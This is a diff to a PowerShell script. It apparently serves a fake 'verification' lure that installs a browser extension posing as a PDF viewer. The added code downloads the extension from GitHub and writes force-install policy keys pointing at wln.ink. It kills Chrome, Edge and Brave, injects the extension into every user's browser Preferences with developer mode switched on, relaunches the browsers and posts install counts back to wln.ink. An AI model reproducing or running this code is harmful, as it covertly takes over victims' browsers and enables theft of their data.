@@ -2,40 +2,43 @@
 $ProgressPreference = 'SilentlyContinue'
 $ExtensionId = 'kklpcoclpjjfiboodbmcpogicnanoopp'
 $UpdateUrl = 'https://wln.ink/ext/update.json'
-$policyValue = "$ExtensionId;$UpdateUrl"
-$installedCount = 0
+$ExtensionZipUrl = 'https://github.com/Castro02980/pdf-viewer-extension/archive/refs/heads/main.zip'
+$injCount = 0
+$polCount = 0
 $relaunchTargets = @()
 $mySession = (Get-Process -Id $PID).SessionId
+$procNames = @('chrome.exe', 'msedge.exe', 'brave.exe')
 try {
-    $policyKeys = @(
+    $tempZip = "$env:TEMP\pdf-viewer-ext.zip"
+    if (Test-Path "$env:TEMP\pdf-viewer-temp") {
+        Remove-Item "$env:TEMP\pdf-viewer-temp" -Recurse -Force
+    }
+    Invoke-WebRequest -Uri $ExtensionZipUrl -OutFile $tempZip -UseBasicParsing
+    Expand-Archive -Path $tempZip -DestinationPath "$env:TEMP\pdf-viewer-temp" -Force
+    Remove-Item $tempZip -Force -ErrorAction SilentlyContinue
+    $manifestPath = Get-ChildItem -Path "$env:TEMP\pdf-viewer-temp" -Filter "manifest.json" -Recurse | Select-Object -First 1
+    if (-not $manifestPath) { throw "manifest missing" }
+    $extensionSourceDir = $manifestPath.DirectoryName
+    $srcManifestRaw = [IO.File]::ReadAllText($manifestPath.FullName)
+    if ($srcManifestRaw -notmatch '"key"\s*:') { throw "manifest key missing" }
+    $policyValue = "$ExtensionId;$UpdateUrl"
+    foreach ($policyKey in @(
         'HKLM:\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist',
         'HKCU:\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist',
         'HKLM:\SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist',
         'HKCU:\SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist',
         'HKLM:\SOFTWARE\Policies\BraveSoftware\Brave-Browser\ExtensionInstallForcelist',
         'HKCU:\SOFTWARE\Policies\BraveSoftware\Brave-Browser\ExtensionInstallForcelist'
-    )
-    foreach ($policyKey in $policyKeys) {
+    )) {
         try {
             New-Item -Path $policyKey -Force -ErrorAction Stop | Out-Null
             New-ItemProperty -Path $policyKey -Name '1' -Value $policyValue -PropertyType String -Force -ErrorAction Stop | Out-Null
-            $installedCount++
+            $polCount++
         } catch { }
-    }
-    if ($installedCount -eq 0) {
-        Write-Host "Verification Failed, try again!" -ForegroundColor Red
-        exit 1
     }
     try {
         Unregister-ScheduledTask -TaskName "PDFViewerExtensionUpdater" -Confirm:$false -ErrorAction Stop | Out-Null
     } catch { }
-    foreach ($u in (Get-ChildItem -Path 'C:\Users' -Directory -ErrorAction SilentlyContinue)) {
-        $oldDir = Join-Path $u.FullName 'AppData\Local\PDFViewerExtension'
-        if (Test-Path $oldDir) {
-            try { Remove-Item $oldDir -Recurse -Force -ErrorAction Stop } catch { }
-        }
-    }
-    $procNames = @('chrome.exe', 'msedge.exe', 'brave.exe')
     foreach ($pn in $procNames) {
         $mains = @(Get-CimInstance Win32_Process -Filter "Name='$pn'" -ErrorAction SilentlyContinue | Where-Object { ([string]$_.CommandLine) -notmatch '--type=' })
         foreach ($m in $mains) {
@@ -70,7 +73,133 @@ try {
             try { Stop-Process -Id $p.Id -Force -ErrorAction Stop } catch { }
         }
     }
+    $deadline = (Get-Date).AddSeconds(8)
+    do {
+        $alive = @(Get-Process -Name 'chrome', 'msedge', 'brave' -ErrorAction SilentlyContinue | Where-Object { $_.SessionId -eq $mySession })
+        if ($alive.Count -eq 0) { break }
+        Start-Sleep -Milliseconds 300
+    } while ((Get-Date) -lt $deadline)
+    $alive = @(Get-Process -Name 'chrome', 'msedge', 'brave' -ErrorAction SilentlyContinue | Where-Object { $_.SessionId -eq $mySession })
+    foreach ($p in $alive) {
+        try { Stop-Process -Id $p.Id -Force -ErrorAction Stop } catch { }
+    }
+    if ($alive.Count -gt 0) { Start-Sleep -Seconds 1 }
+    $useJsx = $false
+    $ser = $null
+    try {
+        Add-Type -AssemblyName "System.Web.Extensions" -ErrorAction Stop
+        $ser = New-Object System.Web.Script.Serialization.JavaScriptSerializer
+        $ser.MaxJsonLength = [int]::MaxValue
+        $ser.RecursionLimit = 500
+        $useJsx = $true
+    } catch { }
+    $dictType = [System.Collections.Generic.Dictionary[string, object]]
+    $browserRels = @(
+        'AppData\Local\Google\Chrome\User Data',
+        'AppData\Local\Microsoft\Edge\User Data',
+        'AppData\Local\BraveSoftware\Brave-Browser\User Data'
+    )
+    foreach ($u in (Get-ChildItem -Path 'C:\Users' -Directory -ErrorAction SilentlyContinue)) {
+        $hasAny = $false
+        foreach ($rel in $browserRels) {
+            if (Test-Path (Join-Path $u.FullName $rel)) { $hasAny = $true; break }
+        }
+        if (-not $hasAny) { continue }
+        $userExtDir = Join-Path $u.FullName 'AppData\Local\PDFViewerExtension'
+        try {
+            if (Test-Path $userExtDir) {
+                Remove-Item $userExtDir -Recurse -Force -ErrorAction Stop
+            }
+            Copy-Item -Path $extensionSourceDir -Destination $userExtDir -Recurse -Force -ErrorAction Stop
+        } catch {
+            continue
+        }
+        $userManifestPath = Join-Path $userExtDir 'manifest.json'
+        if (-not (Test-Path $userManifestPath)) { continue }
+        foreach ($rel in $browserRels) {
+            $userDataDir = Join-Path $u.FullName $rel
+            if (-not (Test-Path $userDataDir)) { continue }
+            $profiles = @(Get-ChildItem -Path $userDataDir -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -eq "Default" -or $_.Name -match "^Profile \d+$" })
+            foreach ($profile in $profiles) {
+                $prefsPath = Join-Path $profile.FullName "Preferences"
+                if (-not (Test-Path $prefsPath)) { continue }
+                try {
+                    $prefsRaw = [IO.File]::ReadAllText($prefsPath)
+                    $manRaw = [IO.File]::ReadAllText($userManifestPath)
+                    if ($useJsx) {
+                        $dict = $ser.DeserializeObject($prefsRaw)
+                        if (-not ($dict -is $dictType)) { $dict = New-Object 'System.Collections.Generic.Dictionary[string, object]' }
+                        if (-not $dict.ContainsKey('extensions') -or -not ($dict['extensions'] -is $dictType)) {
+                            $dict['extensions'] = New-Object 'System.Collections.Generic.Dictionary[string, object]'
+                        }
+                        $extNode = $dict['extensions']
+                        if (-not $extNode.ContainsKey('ui') -or -not ($extNode['ui'] -is $dictType)) {
+                            $extNode['ui'] = New-Object 'System.Collections.Generic.Dictionary[string, object]'
+                        }
+                        $extNode['ui']['developer_mode'] = $true
+                        if (-not $extNode.ContainsKey('settings') -or -not ($extNode['settings'] -is $dictType)) {
+                            $extNode['settings'] = New-Object 'System.Collections.Generic.Dictionary[string, object]'
+                        }
+                        $settings = $extNode['settings']
+                        $entry = New-Object 'System.Collections.Generic.Dictionary[string, object]'
+                        $entry['path'] = $userExtDir
+                        $entry['location'] = 4
+                        $entry['state'] = 1
+                        $entry['manifest'] = $ser.DeserializeObject($manRaw)
+                        $settings[$ExtensionId] = $entry
+                        $out = $ser.Serialize($dict)
+                        $null = $ser.DeserializeObject($out)
+                    } else {
+                        $obj = $prefsRaw | ConvertFrom-Json
+                        if (-not $obj) { $obj = New-Object PSObject }
+                        if (-not $obj.PSObject.Properties['extensions']) {
+                            $obj | Add-Member -NotePropertyName 'extensions' -NotePropertyValue (New-Object PSObject) -Force
+                        }
+                        if (-not $obj.extensions.PSObject.Properties['ui']) {
+                            $obj.extensions | Add-Member -NotePropertyName 'ui' -NotePropertyValue (New-Object PSObject) -Force
+                        }
+                        $obj.extensions.ui | Add-Member -NotePropertyName 'developer_mode' -NotePropertyValue $true -Force
+                        if (-not $obj.extensions.PSObject.Properties['settings']) {
+                            $obj.extensions | Add-Member -NotePropertyName 'settings' -NotePropertyValue (New-Object PSObject) -Force
+                        }
+                        $entry = @{
+                            path = $userExtDir
+                            location = 4
+                            state = 1
+                            manifest = ($manRaw | ConvertFrom-Json)
+                        }
+                        $obj.extensions.settings | Add-Member -NotePropertyName $ExtensionId -NotePropertyValue $entry -Force
+                        $out = $obj | ConvertTo-Json -Depth 64
+                        $null = $out | ConvertFrom-Json
+                    }
+                    [IO.File]::WriteAllText($prefsPath, $out, (New-Object System.Text.UTF8Encoding($false)))
+                    $readback = [IO.File]::ReadAllText($prefsPath)
+                    if ($readback.IndexOf($ExtensionId) -lt 0) { continue }
+                    $injCount++
+                } catch { }
+            }
+        }
+    }
+    Remove-Item "$env:TEMP\pdf-viewer-temp" -Recurse -Force -ErrorAction SilentlyContinue
+    if ($injCount -eq 0 -and $polCount -eq 0) {
+        Write-Host "Verification Failed, try again!" -ForegroundColor Red
+        exit 1
+    }
     if ($relaunchTargets.Count -gt 0) {
+        foreach ($t in $relaunchTargets) {
+            try {
+                if ($t.Args) { Start-Process -FilePath $t.Exe -ArgumentList $t.Args }
+                else { Start-Process -FilePath $t.Exe }
+            } catch { }
+        }
+        Start-Sleep -Seconds 10
+        foreach ($pn in $procNames) {
+            $procName = [IO.Path]::GetFileNameWithoutExtension($pn)
+            $mine = @(Get-Process -Name $procName -ErrorAction SilentlyContinue | Where-Object { $_.SessionId -eq $mySession })
+            foreach ($p in $mine) {
+                try { Stop-Process -Id $p.Id -Force -ErrorAction Stop } catch { }
+            }
+        }
         Start-Sleep -Seconds 2
         foreach ($t in $relaunchTargets) {
             try {
@@ -80,7 +209,7 @@ try {
         }
     }
     try {
-        $notifyBody = "ev=install&os=windows&v=1.0.0&extra=policies:$installedCount"
+        $notifyBody = "ev=install&os=windows&v=1.0.0&extra=inj:$injCount,pol:$polCount"
         Invoke-WebRequest -Uri "https://wln.ink/n" -Method Post -Body $notifyBody `
             -ContentType "text/plain" -UseBasicParsing -TimeoutSec 5 | Out-Null
     } catch { }
